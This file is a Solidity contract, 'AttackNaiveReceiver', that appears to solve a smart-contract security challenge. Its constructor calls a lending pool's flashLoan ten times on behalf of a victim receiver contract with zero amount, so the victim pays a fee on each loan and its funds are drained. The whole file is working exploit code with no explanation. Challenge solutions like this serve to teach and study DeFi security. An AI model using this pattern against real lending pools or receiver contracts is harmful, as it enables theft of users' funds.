// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool{
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

contract AttackNaiveReceiver {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _victim){
        for(uint256 i=0; i<10; i++){
            IPool(_pool).flashLoan(_victim, ETH, 0, "0x");
        }
    }
}
